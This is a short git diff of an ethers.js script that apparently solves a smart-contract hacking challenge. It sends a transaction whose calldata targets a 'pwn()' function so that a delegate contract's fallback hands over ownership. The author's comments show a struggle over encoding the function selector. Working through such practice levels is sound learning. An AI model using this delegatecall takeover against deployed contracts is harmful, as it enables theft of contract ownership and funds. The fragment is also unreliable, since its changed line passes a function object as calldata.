@@ -20,6 +20,8 @@ async function main() {
     signer
   );
 
+    console.log(contractDelegate.pwn);
+
   // send an empty transaction to trigger fallback
   console.log(
     await signer.sendTransaction({
@@ -27,7 +29,8 @@ async function main() {
       to: DELEGATE_CONTRACT,
       value: 0,
       gasLimit: 50000,
-      data: await ethers.utils.keccak256("pwn()"), //This is the line of code that is driving me insane
+      // data: await ethers.utils.keccak256("pwn()"), //This is the line of code that is driving me insane -> remember that is only the first 4 bytes -> 8 characters
+      data: contractDelegate.pwn, //This is the line of code that is driving me insane
     })
   );
   // Check the contract address
